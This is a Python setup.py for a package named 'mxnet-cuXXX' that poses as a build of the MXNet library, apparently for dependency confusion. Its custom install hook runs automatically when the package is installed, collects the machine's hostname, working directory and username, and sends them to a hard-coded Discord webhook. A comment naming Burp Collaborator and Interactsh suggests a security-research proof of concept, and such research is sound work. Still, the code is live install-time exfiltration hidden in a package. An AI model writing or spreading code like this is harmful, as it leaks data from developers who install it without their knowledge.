from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://discord.com/api/webhooks/948685141331558460/ozpP_ba0DN9yyMKdP4nXiSWzfdUGZ5SQizBgxTC6fjPyOoZApHfksyJZyhstUfg7KQho",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='mxnet-cuXXX', #package name
      version='1.12.0',
      description='AnupamAS01',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
